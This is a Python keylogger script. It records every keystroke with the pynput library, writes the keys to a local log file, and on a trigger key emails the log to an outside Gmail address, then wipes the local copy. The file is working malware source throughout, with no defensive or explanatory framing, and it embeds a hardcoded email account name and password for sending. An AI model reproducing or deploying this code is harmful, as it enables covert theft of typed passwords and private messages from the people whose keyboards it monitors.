from pynput.keyboard import Key, Listener
from mail import SendMessage
import datetime
import time


count = 0
keys = []


def on_press(key):
    global count, keys

    count += 1
    keys.append(key)
    print('{} pressed'.format(key))

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open('log.txt', 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find('space') > 0:
                f.write(" ")
            elif k.find('enter') > 0:
                f.write("\n")
            elif k.find('Key') == -1:
                f.write(k)


def on_release(key):
    if key == Key.insert:
        send_log()
        print('\n[!] Shutting down...')
        time.sleep(1.5)
        return False


def clear():
    file = open("log.txt", 'w')
    file.truncate(0)
    file.close()


def send_log():
    print('\n[+] Sending log...')

    message = SendMessage('logsender12@gmail.com','gyk742des')
    message.subject('Key Logger log')
    message.body('This is the data recorded by the key logger on {}'.format(datetime.datetime.now()))
    message.attach('log.txt', 'log.txt')
    message.send_mail('logreceiver12@gmail.com')

    clear()


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
